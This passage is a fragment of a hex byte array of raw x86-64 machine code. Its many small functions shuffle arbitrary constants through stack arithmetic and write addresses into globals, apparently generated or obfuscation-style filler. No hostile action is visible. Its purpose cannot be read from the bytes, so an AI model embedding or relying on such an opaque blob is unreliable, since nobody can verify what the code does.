	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x18, 0xC7, 0x04, 0x24, 0x52,
	0x99, 0x00, 0x37, 0xC7, 0x44, 0x24, 0x04, 0x2C, 0xBE, 0x6C, 0x4D, 0x48,
	0x8D, 0x05, 0x46, 0x23, 0x00, 0x00, 0x48, 0x89, 0x05, 0x9F, 0x4E, 0x00,
	0x00, 0x48, 0x8D, 0x05, 0x58, 0x23, 0x00, 0x00, 0x48, 0x89, 0x05, 0x91,
	0x4E, 0x00, 0x00, 0x8B, 0x05, 0x83, 0x4E, 0x00, 0x00, 0x03, 0x04, 0x24,
	0x89, 0x05, 0x7A, 0x4E, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x18, 0xC3, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x48, 0x8D, 0x05, 0xB9, 0x2C, 0x00, 0x00, 0x48, 0x89, 0x05, 0x62, 0x4E,
	0x00, 0x00, 0x48, 0x8D, 0x05, 0xCB, 0x2C, 0x00, 0x00, 0x48, 0x89, 0x05,
	0x54, 0x4E, 0x00, 0x00, 0x48, 0x8D, 0x05, 0xDD, 0x2C, 0x00, 0x00, 0x48,
	0x89, 0x05, 0x46, 0x4E, 0x00, 0x00, 0x48, 0x8D, 0x05, 0xEF, 0x2C, 0x00,
	0x00, 0x48, 0x89, 0x05, 0x38, 0x4E, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x11,
	0x2D, 0x00, 0x00, 0x48, 0x89, 0x05, 0x2A, 0x4E, 0x00, 0x00, 0x48, 0x8D,
	0x05, 0x33, 0x2D, 0x00, 0x00, 0x48, 0x89, 0x05, 0x1C, 0x4E, 0x00, 0x00,
	0x48, 0x8D, 0x05, 0x45, 0x2D, 0x00, 0x00, 0x48, 0x89, 0x05, 0x0E, 0x4E,
	0x00, 0x00, 0x48, 0x8D, 0x05, 0x57, 0x2D, 0x00, 0x00, 0x48, 0x89, 0x05,
	0x00, 0x4E, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x59, 0x2D, 0x00, 0x00, 0x48,
	0x89, 0x05, 0xF2, 0x4D, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x6B, 0x2D, 0x00,
	0x00, 0x48, 0x89, 0x05, 0xE4, 0x4D, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x7D,
	0x2D, 0x00, 0x00, 0x48, 0x89, 0x05, 0xD6, 0x4D, 0x00, 0x00, 0x48, 0x8D,
	0x05, 0x8F, 0x2D, 0x00, 0x00, 0x48, 0x89, 0x05, 0xC8, 0x4D, 0x00, 0x00,
	0x48, 0x8D, 0x05, 0x91, 0x2D, 0x00, 0x00, 0x48, 0x89, 0x05, 0xBA, 0x4D,
	0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x48, 0x8D, 0x05, 0x69, 0x21, 0x00, 0x00, 0x48, 0x89, 0x05, 0xA2, 0x4D,
	0x00, 0x00, 0x48, 0x8D, 0x05, 0x7B, 0x21, 0x00, 0x00, 0x48, 0x89, 0x05,
	0x94, 0x4D, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x9D, 0x21, 0x00, 0x00, 0x48,
	0x89, 0x05, 0x86, 0x4D, 0x00, 0x00, 0x48, 0x8D, 0x05, 0xAF, 0x21, 0x00,
	0x00, 0x48, 0x89, 0x05, 0x78, 0x4D, 0x00, 0x00, 0x48, 0x8D, 0x05, 0xC1,
	0x21, 0x00, 0x00, 0x48, 0x89, 0x05, 0x6A, 0x4D, 0x00, 0x00, 0x48, 0x8D,
	0x05, 0xC3, 0x21, 0x00, 0x00, 0x48, 0x89, 0x05, 0x5C, 0x4D, 0x00, 0x00,
	0x48, 0x8D, 0x05, 0xD5, 0x21, 0x00, 0x00, 0x48, 0x89, 0x05, 0x4E, 0x4D,
	0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0xC7, 0x44, 0x24, 0x10,
	0x5C, 0x39, 0xEE, 0xA0, 0xC7, 0x44, 0x24, 0x08, 0x99, 0xAC, 0xAF, 0x21,
	0xC7, 0x04, 0x24, 0x62, 0x33, 0xF4, 0x1A, 0xC7, 0x44, 0x24, 0x14, 0x12,
	0x64, 0x48, 0x45, 0xC7, 0x44, 0x24, 0x18, 0x0F, 0x7B, 0xC3, 0x1C, 0xC7,
	0x44, 0x24, 0x04, 0x7D, 0x69, 0x32, 0x82, 0xC7, 0x44, 0x24, 0x0C, 0xEA,
	0xA8, 0x00, 0x32, 0x48, 0x8D, 0x05, 0xEE, 0x27, 0x00, 0x00, 0x48, 0x89,
	0x05, 0xF7, 0x4C, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x10, 0x28, 0x00, 0x00,
	0x48, 0x89, 0x05, 0xE9, 0x4C, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x12, 0x28,
	0x00, 0x00, 0x48, 0x89, 0x05, 0xDB, 0x4C, 0x00, 0x00, 0x48, 0x8D, 0x05,
	0x14, 0x28, 0x00, 0x00, 0x48, 0x89, 0x05, 0xCD, 0x4C, 0x00, 0x00, 0x48,
	0x8D, 0x05, 0x16, 0x28, 0x00, 0x00, 0x48, 0x89, 0x05, 0xBF, 0x4C, 0x00,
	0x00, 0x48, 0x8D, 0x05, 0x28, 0x28, 0x00, 0x00, 0x48, 0x89, 0x05, 0xB1,
	0x4C, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x3A, 0x28, 0x00, 0x00, 0x48, 0x89,
	0x05, 0xA3, 0x4C, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x4C, 0x28, 0x00, 0x00,
	0x48, 0x89, 0x05, 0x95, 0x4C, 0x00, 0x00, 0x8B, 0x44, 0x24, 0x04, 0x8B,
	0x0C, 0x24, 0x03, 0xC8, 0x8B, 0xC1, 0x89, 0x04, 0x24, 0x8B, 0x05, 0x79,
	0x4C, 0x00, 0x00, 0x03, 0x44, 0x24, 0x04, 0x89, 0x05, 0x6F, 0x4C, 0x00,
	0x00, 0x8B, 0x44, 0x24, 0x08, 0x35, 0x92, 0x68, 0x00, 0x00, 0x8B, 0x0C,
	0x24, 0x2B, 0xC8, 0x8B, 0xC1, 0x89, 0x04, 0x24, 0x8B, 0x44, 0x24, 0x08,
	0x35, 0x10, 0x1D, 0x00, 0x00, 0x8B, 0x4C, 0x24, 0x04, 0x2B, 0xC8, 0x8B,
	0xC1, 0x89, 0x44, 0x24, 0x04, 0x8B, 0x44, 0x24, 0x0C, 0x35, 0xDC, 0xA6,
	0x00, 0x00, 0x8B, 0x0C, 0x24, 0x2B, 0xC8, 0x8B, 0xC1, 0x89, 0x04, 0x24,
	0x8B, 0x05, 0x2E, 0x4C, 0x00, 0x00, 0x03, 0x44, 0x24, 0x08, 0x89, 0x05,
	0x24, 0x4C, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x05, 0x28, 0x00, 0x00, 0x48,
	0x89, 0x05, 0x1E, 0x4C, 0x00, 0x00, 0x8B, 0x44, 0x24, 0x04, 0x83, 0xE0,
	0xFE, 0x8B, 0x0C, 0x24, 0x03, 0xC8, 0x8B, 0xC1, 0x89, 0x04, 0x24, 0x8B,
	0x44, 0x24, 0x04, 0x83, 0xC8, 0x01, 0x8B, 0x0C, 0x24, 0x03, 0xC8, 0x8B,
	0xC1, 0x89, 0x04, 0x24, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0xC7, 0x44, 0x24, 0x04,
	0x72, 0x49, 0xC7, 0x16, 0xC7, 0x44, 0x24, 0x0C, 0xFD, 0xA0, 0xB7, 0x07,
	0xC7, 0x44, 0x24, 0x14, 0xC9, 0x5B, 0xE2, 0xEF, 0xC7, 0x44, 0x24, 0x10,
	0xC9, 0x3B, 0x78, 0x4D, 0xC7, 0x04, 0x24, 0xE9, 0x91, 0xCB, 0xB5, 0xC7,
	0x44, 0x24, 0x08, 0x32, 0x91, 0xDE, 0xDC, 0x48, 0x8D, 0x05, 0x26, 0x29,
	0x00, 0x00, 0x48, 0x89, 0x05, 0xAF, 0x4B, 0x00, 0x00, 0x48, 0x8D, 0x05,
	0x48, 0x29, 0x00, 0x00, 0x48, 0x89, 0x05, 0xA1, 0x4B, 0x00, 0x00, 0x48,
	0x8D, 0x05, 0x4A, 0x29, 0x00, 0x00, 0x48, 0x89, 0x05, 0x93, 0x4B, 0x00,
	0x00, 0x48, 0x8D, 0x05, 0x4C, 0x29, 0x00, 0x00, 0x48, 0x89, 0x05, 0x85,
	0x4B, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x5E, 0x29, 0x00, 0x00, 0x48, 0x89,
	0x05, 0x77, 0x4B, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x70, 0x29, 0x00, 0x00,
	0x48, 0x89, 0x05, 0x69, 0x4B, 0x00, 0x00, 0x8B, 0x44, 0x24, 0x0C, 0x35,
	0x02, 0x36, 0x00, 0x00, 0x8B, 0x4C, 0x24, 0x08, 0x2B, 0xC8, 0x8B, 0xC1,
	0x89, 0x44, 0x24, 0x08, 0x8B, 0x05, 0x46, 0x4B, 0x00, 0x00, 0x03, 0x04,
	0x24, 0x89, 0x05, 0x3D, 0x4B, 0x00, 0x00, 0x8B, 0x44, 0x24, 0x10, 0x35,
	0x58, 0x50, 0x00, 0x00, 0x8B, 0x0C, 0x24, 0x2B, 0xC8, 0x8B, 0xC1, 0x89,
	0x04, 0x24, 0x8B, 0x44, 0x24, 0x04, 0x05, 0x29, 0x03, 0x00, 0x00, 0x89,
	0x44, 0x24, 0x04, 0x8B, 0x44, 0x24, 0x14, 0x8B, 0x0C, 0x24, 0x03, 0xC8,
	0x8B, 0xC1, 0x89, 0x04, 0x24, 0x8B, 0x04, 0x24, 0x8B, 0x4C, 0x24, 0x04,
	0x03, 0xC8, 0x8B, 0xC1, 0x89, 0x44, 0x24, 0x04, 0x8B, 0x44, 0x24, 0x08,
	0x83, 0xC8, 0x01, 0x8B, 0x0C, 0x24, 0x03, 0xC8, 0x8B, 0xC1, 0x89, 0x04,
	0x24, 0x48, 0x8D, 0x05, 0x10, 0x29, 0x00, 0x00, 0x48, 0x89, 0x05, 0xE9,
	0x4A, 0x00, 0x00, 0x8B, 0x44, 0x24, 0x04, 0x35, 0x3C, 0x6F, 0x00, 0x00,
	0x8B, 0x0C, 0x24, 0x2B, 0xC8, 0x8B, 0xC1, 0x89, 0x04, 0x24, 0x8B, 0x04,
	0x24, 0x8B, 0x4C, 0x24, 0x08, 0x03, 0xC8, 0x8B, 0xC1, 0x89, 0x44, 0x24,
	0x08, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x18,
	0xC7, 0x44, 0x24, 0x08, 0x01, 0xF7, 0x7D, 0xB0, 0xC7, 0x44, 0x24, 0x0C,
	0xBF, 0x51, 0xD6, 0x3D, 0xC7, 0x04, 0x24, 0x91, 0x1E, 0x97, 0x96, 0xC7,
	0x44, 0x24, 0x04, 0x77, 0xC9, 0x18, 0x50, 0x48, 0x8D, 0x05, 0x76, 0x2A,
	0x00, 0x00, 0x48, 0x89, 0x05, 0x8F, 0x4A, 0x00, 0x00, 0x48, 0x8D, 0x05,
	0x88, 0x2A, 0x00, 0x00, 0x48, 0x89, 0x05, 0x81, 0x4A, 0x00, 0x00, 0x48,
	0x8D, 0x05, 0x9A, 0x2A, 0x00, 0x00, 0x48, 0x89, 0x05, 0x73, 0x4A, 0x00,
	0x00, 0x48, 0x8D, 0x05, 0xAC, 0x2A, 0x00, 0x00, 0x48, 0x89, 0x05, 0x65,
	0x4A, 0x00, 0x00, 0x48, 0x8D, 0x05, 0xAE, 0x2A, 0x00, 0x00, 0x48, 0x89,
	0x05, 0x57, 0x4A, 0x00, 0x00, 0x48, 0x8D, 0x05, 0xB0, 0x2A, 0x00, 0x00,
	0x48, 0x89, 0x05, 0x49, 0x4A, 0x00, 0x00, 0x48, 0x8D, 0x05, 0xC2, 0x2A,
	0x00, 0x00, 0x48, 0x89, 0x05, 0x3B, 0x4A, 0x00, 0x00, 0x48, 0x8D, 0x05,
	0xC4, 0x2A, 0x00, 0x00, 0x48, 0x89, 0x05, 0x2D, 0x4A, 0x00, 0x00, 0x8B,
	0x05, 0x1F, 0x4A, 0x00, 0x00, 0x03, 0x04, 0x24, 0x89, 0x05, 0x16, 0x4A,
	0x00, 0x00, 0x8B, 0x05, 0x10, 0x4A, 0x00, 0x00, 0x03, 0x44, 0x24, 0x04,
	0x89, 0x05, 0x06, 0x4A, 0x00, 0x00, 0x8B, 0x05, 0x00, 0x4A, 0x00, 0x00,
	0x03, 0x04, 0x24, 0x89, 0x05, 0xF7, 0x49, 0x00, 0x00, 0x8B, 0x05, 0xF1,
	0x49, 0x00, 0x00, 0x03, 0x04, 0x24, 0x89, 0x05, 0xE8, 0x49, 0x00, 0x00,
	0x48, 0x83, 0xC4, 0x18, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0xC7, 0x44, 0x24, 0x08,
	0x00, 0xB1, 0x3C, 0x36, 0xC7, 0x44, 0x24, 0x0C, 0x10, 0xE9, 0x4C, 0x5A,
	0xC7, 0x44, 0x24, 0x10, 0x75, 0x0A, 0xB3, 0xC5, 0xC7, 0x44, 0x24, 0x04,
	0xFC, 0x8A, 0xCF, 0x84, 0xC7, 0x04, 0x24, 0x1A, 0x39, 0xA0, 0x62, 0x48,
	0x8D, 0x05, 0x5E, 0x21, 0x00, 0x00, 0x48, 0x89, 0x05, 0xA7, 0x49, 0x00,
	0x00, 0x48, 0x8D, 0x05, 0x80, 0x21, 0x00, 0x00, 0x48, 0x89, 0x05, 0x99,
	0x49, 0x00, 0x00, 0x48, 0x8D, 0x05, 0xA2, 0x21, 0x00, 0x00, 0x48, 0x89,
	0x05, 0x8B, 0x49, 0x00, 0x00, 0x48, 0x8D, 0x05, 0xB4, 0x21, 0x00, 0x00,
	0x48, 0x89, 0x05, 0x7D, 0x49, 0x00, 0x00, 0x48, 0x8D, 0x05, 0xB6, 0x21,
	0x00, 0x00, 0x48, 0x89, 0x05, 0x6F, 0x49, 0x00, 0x00, 0x48, 0x8D, 0x05,
	0xC8, 0x21, 0x00, 0x00, 0x48, 0x89, 0x05, 0x61, 0x49, 0x00, 0x00, 0x48,
	0x8D, 0x05, 0xCA, 0x21, 0x00, 0x00, 0x48, 0x89, 0x05, 0x53, 0x49, 0x00,
	0x00, 0x48, 0x8D, 0x05, 0xDC, 0x21, 0x00, 0x00, 0x48, 0x89, 0x05, 0x45,
	0x49, 0x00, 0x00, 0x48, 0x8D, 0x05, 0xDE, 0x21, 0x00, 0x00, 0x48, 0x89,
	0x05, 0x37, 0x49, 0x00, 0x00, 0x48, 0x8D, 0x05, 0xF0, 0x21, 0x00, 0x00,
	0x48, 0x89, 0x05, 0x29, 0x49, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x02, 0x22,
	0x00, 0x00, 0x48, 0x89, 0x05, 0x1B, 0x49, 0x00, 0x00, 0x48, 0x8D, 0x05,
	0x04, 0x22, 0x00, 0x00, 0x48, 0x89, 0x05, 0x0D, 0x49, 0x00, 0x00, 0x48,
	0x8D, 0x05, 0x16, 0x22, 0x00, 0x00, 0x48, 0x89, 0x05, 0xFF, 0x48, 0x00,
	0x00, 0x48, 0x8D, 0x05, 0x28, 0x22, 0x00, 0x00, 0x48, 0x89, 0x05, 0xF1,
	0x48, 0x00, 0x00, 0x8B, 0x05, 0xE3, 0x48, 0x00, 0x00, 0x03, 0x04, 0x24,
	0x89, 0x05, 0xDA, 0x48, 0x00, 0x00, 0x8B, 0x05, 0xD4, 0x48, 0x00, 0x00,
	0x03, 0x44, 0x24, 0x08, 0x89, 0x05, 0xCA, 0x48, 0x00, 0x00, 0x8B, 0x05,
	0xC4, 0x48, 0x00, 0x00, 0x03, 0x04, 0x24, 0x89, 0x05, 0xBB, 0x48, 0x00,
	0x00, 0x8B, 0x05, 0xB5, 0x48, 0x00, 0x00, 0x03, 0x44, 0x24, 0x04, 0x89,
	0x05, 0xAB, 0x48, 0x00, 0x00, 0x8B, 0x05, 0xA5, 0x48, 0x00, 0x00, 0x03,
	0x44, 0x24, 0x04, 0x89, 0x05, 0x9B, 0x48, 0x00, 0x00, 0x48, 0x83, 0xC4,
	0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x8D, 0x05, 0x29, 0x1B, 0x00, 0x00, 0x48,
	0x89, 0x05, 0x82, 0x48, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x3B, 0x1B, 0x00,
	0x00, 0x48, 0x89, 0x05, 0x74, 0x48, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x4D,
	0x1B, 0x00, 0x00, 0x48, 0x89, 0x05, 0x66, 0x48, 0x00, 0x00, 0x48, 0x8D,
	0x05, 0x4F, 0x1B, 0x00, 0x00, 0x48, 0x89, 0x05, 0x58, 0x48, 0x00, 0x00,
	0x48, 0x8D, 0x05, 0x51, 0x1B, 0x00, 0x00, 0x48, 0x89, 0x05, 0x4A, 0x48,
	0x00, 0x00, 0x48, 0x8D, 0x05, 0x63, 0x1B, 0x00, 0x00, 0x48, 0x89, 0x05,
	0x3C, 0x48, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x65, 0x1B, 0x00, 0x00, 0x48,
	0x89, 0x05, 0x2E, 0x48, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x77, 0x1B, 0x00,
	0x00, 0x48, 0x89, 0x05, 0x20, 0x48, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x79,
	0x1B, 0x00, 0x00, 0x48, 0x89, 0x05, 0x12, 0x48, 0x00, 0x00, 0xC3, 0xCC,
	0x48, 0x83, 0xEC, 0x28, 0xC7, 0x04, 0x24, 0xBB, 0xD8, 0x18, 0xF6, 0xC7,
	0x44, 0x24, 0x08, 0x65, 0x09, 0xF1, 0xF1, 0xC7, 0x44, 0x24, 0x10, 0xFD,
	0x7A, 0x20, 0x40, 0xC7, 0x44, 0x24, 0x04, 0xCD, 0x26, 0xF8, 0xBC, 0xC7,
	0x44, 0x24, 0x0C, 0x5D, 0xBA, 0x7F, 0xC6, 0x8B, 0x44, 0x24, 0x08, 0x8B,
	0x4C, 0x24, 0x04, 0x33, 0xC8, 0x8B, 0xC1, 0x89, 0x44, 0x24, 0x04, 0x8B,
	0x44, 0x24, 0x04, 0x8B, 0x0C, 0x24, 0x03, 0xC8, 0x8B, 0xC1, 0x89, 0x04,
	0x24, 0x8B, 0x05, 0xB9, 0x47, 0x00, 0x00, 0x03, 0x44, 0x24, 0x10, 0x89,
	0x05, 0xAF, 0x47, 0x00, 0x00, 0x8B, 0x44, 0x24, 0x08, 0x8B, 0x4C, 0x24,
	0x0C, 0x2B, 0xC8, 0x8B, 0xC1, 0x89, 0x44, 0x24, 0x0C, 0x8B, 0x05, 0x99,
	0x47, 0x00, 0x00, 0x03, 0x44, 0x24, 0x04, 0x89, 0x05, 0x8F, 0x47, 0x00,
	0x00, 0x8B, 0x44, 0x24, 0x04, 0x8B, 0x0C, 0x24, 0x33, 0xC8, 0x8B, 0xC1,
	0x89, 0x04, 0x24, 0x8B, 0x05, 0x7B, 0x47, 0x00, 0x00, 0x03, 0x04, 0x24,
	0x89, 0x05, 0x72, 0x47, 0x00, 0x00, 0x8B, 0x05, 0x6C, 0x47, 0x00, 0x00,
	0x03, 0x44, 0x24, 0x04, 0x89, 0x05, 0x62, 0x47, 0x00, 0x00, 0x8B, 0x44,
	0x24, 0x08, 0x8B, 0x0C, 0x24, 0x2B, 0xC8, 0x8B, 0xC1, 0x89, 0x04, 0x24,
	0x8B, 0x05, 0x4E, 0x47, 0x00, 0x00, 0x03, 0x44, 0x24, 0x08, 0x89, 0x05,
	0x44, 0x47, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x8D, 0x05, 0x79, 0x20, 0x00, 0x00, 0x48,
	0x89, 0x05, 0x32, 0x47, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x7B, 0x20, 0x00,
	0x00, 0x48, 0x89, 0x05, 0x24, 0x47, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x8D,
	0x20, 0x00, 0x00, 0x48, 0x89, 0x05, 0x16, 0x47, 0x00, 0x00, 0x48, 0x8D,
	0x05, 0x9F, 0x20, 0x00, 0x00, 0x48, 0x89, 0x05, 0x08, 0x47, 0x00, 0x00,
	0x48, 0x8D, 0x05, 0xB1, 0x20, 0x00, 0x00, 0x48, 0x89, 0x05, 0xFA, 0x46,
	0x00, 0x00, 0x48, 0x8D, 0x05, 0xC3, 0x20, 0x00, 0x00, 0x48, 0x89, 0x05,
	0xEC, 0x46, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x18, 0xC7, 0x04, 0x24, 0x27,
	0xE9, 0x2C, 0xC4, 0xC7, 0x44, 0x24, 0x08, 0xCC, 0x77, 0x96, 0xD1, 0xC7,
	0x44, 0x24, 0x04, 0x1B, 0x8C, 0x7F, 0xA7, 0x48, 0x8D, 0x05, 0x3E, 0x1A,
	0x00, 0x00, 0x48, 0x89, 0x05, 0xB7, 0x46, 0x00, 0x00, 0x48, 0x8D, 0x05,
	0x40, 0x1A, 0x00, 0x00, 0x48, 0x89, 0x05, 0xA9, 0x46, 0x00, 0x00, 0x48,
	0x8D, 0x05, 0x42, 0x1A, 0x00, 0x00, 0x48, 0x89, 0x05, 0x9B, 0x46, 0x00,
	0x00, 0x8B, 0x05, 0x8D, 0x46, 0x00, 0x00, 0x03, 0x04, 0x24, 0x89, 0x05,
	0x84, 0x46, 0x00, 0x00, 0x8B, 0x05, 0x7E, 0x46, 0x00, 0x00, 0x03, 0x44,
	0x24, 0x04, 0x89, 0x05, 0x74, 0x46, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x18,
	0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28,
	0xC7, 0x04, 0x24, 0x22, 0xDF, 0x88, 0x3F, 0xC7, 0x44, 0x24, 0x08, 0x92,
	0x6E, 0x98, 0x8A, 0xC7, 0x44, 0x24, 0x14, 0xB0, 0xCC, 0x70, 0xB2, 0xC7,
	0x44, 0x24, 0x18, 0xE2, 0x01, 0x4F, 0x8C, 0xC7, 0x44, 0x24, 0x10, 0x1F,
	0xD9, 0x02, 0xC4, 0xC7, 0x44, 0x24, 0x04, 0x54, 0x2B, 0x2D, 0x5C, 0xC7,
	0x44, 0x24, 0x0C, 0x75, 0x6D, 0xB8, 0x67, 0x8B, 0x04, 0x24, 0x8B, 0x4C,
	0x24, 0x04, 0x0B, 0xC8, 0x8B, 0xC1, 0x89, 0x44, 0x24, 0x04, 0x8B, 0x44,
	0x24, 0x14, 0x8B, 0x4C, 0x24, 0x0C, 0x03, 0xC8, 0x8B, 0xC1, 0x89, 0x44,
	0x24, 0x0C, 0x8B, 0x05, 0x08, 0x46, 0x00, 0x00, 0x03, 0x44, 0x24, 0x0C,
	0x89, 0x05, 0xFE, 0x45, 0x00, 0x00, 0x8B, 0x05, 0xF8, 0x45, 0x00, 0x00,
	0x03, 0x44, 0x24, 0x18, 0x89, 0x05, 0xEE, 0x45, 0x00, 0x00, 0x8B, 0x04,
	0x24, 0x8B, 0x4C, 0x24, 0x04, 0x03, 0xC8, 0x8B, 0xC1, 0x89, 0x44, 0x24,
	0x04, 0x8B, 0x04, 0x24, 0x8B, 0x4C, 0x24, 0x08, 0x03, 0xC8, 0x8B, 0xC1,
	0x89, 0x44, 0x24, 0x08, 0x8B, 0x44, 0x24, 0x08, 0x8B, 0x0C, 0x24, 0x03,
	0xC8, 0x8B, 0xC1, 0x89, 0x04, 0x24, 0x8B, 0x05, 0xBC, 0x45, 0x00, 0x00,
	0x03, 0x44, 0x24, 0x04, 0x89, 0x05, 0xB2, 0x45, 0x00, 0x00, 0x8B, 0x05,
	0xAC, 0x45, 0x00, 0x00, 0x03, 0x44, 0x24, 0x08, 0x89, 0x05, 0xA2, 0x45,
	0x00, 0x00, 0x8B, 0x44, 0x24, 0x08, 0x8B, 0x4C, 0x24, 0x10, 0x0B, 0xC8,
	0x8B, 0xC1, 0x89, 0x44, 0x24, 0x10, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x38, 0xC7, 0x44, 0x24, 0x14,
	0x51, 0xCC, 0xD2, 0x26, 0xC7, 0x44, 0x24, 0x18, 0xE7, 0x8D, 0xAF, 0xB1,
	0xC7, 0x44, 0x24, 0x08, 0x9C, 0xBF, 0xBF, 0x01, 0xC7, 0x04, 0x24, 0xB9,
	0xCF, 0xA5, 0xDC, 0xC7, 0x44, 0x24, 0x1C, 0x6F, 0xEB, 0xBB, 0x7F, 0xC7,
	0x44, 0x24, 0x20, 0xE7, 0x65, 0x03, 0x33, 0xC7, 0x44, 0x24, 0x04, 0x7C,
	0x6B, 0xED, 0x77, 0xC7, 0x44, 0x24, 0x24, 0x13, 0xFA, 0xAD, 0x5B, 0xC7,
	0x44, 0x24, 0x0C, 0xC0, 0x35, 0x80, 0xEE, 0xC7, 0x44, 0x24, 0x10, 0x51,
	0x2E, 0x63, 0x39, 0x48, 0x8D, 0x05, 0x66, 0x26, 0x00, 0x00, 0x48, 0x89,
	0x05, 0x2F, 0x45, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x68, 0x26, 0x00, 0x00,
	0x48, 0x89, 0x05, 0x21, 0x45, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x6A, 0x26,
	0x00, 0x00, 0x48, 0x89, 0x05, 0x13, 0x45, 0x00, 0x00, 0x48, 0x8D, 0x05,
	0x6C, 0x26, 0x00, 0x00, 0x48, 0x89, 0x05, 0x05, 0x45, 0x00, 0x00, 0x48,
	0x8D, 0x05, 0x6E, 0x26, 0x00, 0x00, 0x48, 0x89, 0x05, 0xF7, 0x44, 0x00,
	0x00, 0x48, 0x8D, 0x05, 0x70, 0x26, 0x00, 0x00, 0x48, 0x89, 0x05, 0xE9,
	0x44, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x82, 0x26, 0x00, 0x00, 0x48, 0x89,
	0x05, 0xDB, 0x44, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x84, 0x26, 0x00, 0x00,
	0x48, 0x89, 0x05, 0xCD, 0x44, 0x00, 0x00, 0x8B, 0x05, 0xBF, 0x44, 0x00,
	0x00, 0x03, 0x44, 0x24, 0x08, 0x89, 0x05, 0xB5, 0x44, 0x00, 0x00, 0x48,
	0x8D, 0x05, 0x76, 0x26, 0x00, 0x00, 0x48, 0x89, 0x05, 0xAF, 0x44, 0x00,
	0x00, 0x48, 0x8D, 0x05, 0x78, 0x26, 0x00, 0x00, 0x48, 0x89, 0x05, 0xA1,
	0x44, 0x00, 0x00, 0x8B, 0x04, 0x24, 0x8B, 0x4C, 0x24, 0x04, 0x03, 0xC8,
	0x8B, 0xC1, 0x89, 0x44, 0x24, 0x04, 0x48, 0x8D, 0x05, 0x7B, 0x26, 0x00,
	0x00, 0x48, 0x89, 0x05, 0x84, 0x44, 0x00, 0x00, 0x8B, 0x44, 0x24, 0x10,
	0x83, 0xC8, 0x01, 0x8B, 0x0C, 0x24, 0x03, 0xC8, 0x8B, 0xC1, 0x89, 0x04,
	0x24, 0x8B, 0x44, 0x24, 0x08, 0x8B, 0x4C, 0x24, 0x0C, 0x03, 0xC8, 0x8B,
	0xC1, 0x89, 0x44, 0x24, 0x0C, 0x48, 0x8D, 0x05, 0x5C, 0x26, 0x00, 0x00,
	0x48, 0x89, 0x05, 0x55, 0x44, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x5E, 0x26,
	0x00, 0x00, 0x48, 0x89, 0x05, 0x47, 0x44, 0x00, 0x00, 0x48, 0x83, 0xC4,
	0x38, 0xC3, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0xC7, 0x44, 0x24, 0x04,
	0x51, 0x20, 0x1E, 0x75, 0xC7, 0x44, 0x24, 0x08, 0x90, 0x78, 0x1B, 0xD0,
	0xC7, 0x44, 0x24, 0x10, 0xC1, 0xEC, 0xFB, 0x9C, 0xC7, 0x04, 0x24, 0x8C,
	0x96, 0x07, 0x13, 0xC7, 0x44, 0x24, 0x14, 0x18, 0x5B, 0xB1, 0xDC, 0xC7,
	0x44, 0x24, 0x0C, 0x9C, 0x54, 0x5A, 0x7A, 0x48, 0x8D, 0x05, 0xB6, 0x24,
	0x00, 0x00, 0x48, 0x89, 0x05, 0xFF, 0x43, 0x00, 0x00, 0x48, 0x8D, 0x05,
	0xC8, 0x24, 0x00, 0x00, 0x48, 0x89, 0x05, 0xF1, 0x43, 0x00, 0x00, 0x48,
